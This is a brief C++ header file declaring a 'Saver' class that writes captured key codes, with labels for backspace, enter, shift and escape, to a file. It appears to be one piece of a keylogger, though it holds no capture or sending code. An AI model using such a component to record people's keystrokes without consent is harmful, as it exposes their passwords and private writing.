#pragma once

class Saver {
public:

	Saver(const char* filename, bool debug);
	~Saver();
	int Save(int& _key);

	bool isdebug;


private:

	const char* BKSP = "BKSP";
	const char* ENTR = "\n";
	const char* SHFT = "SHFT";
	const char* ESCP = "ESCP";

	FILE* file;

	bool write_to_file(char* str);


};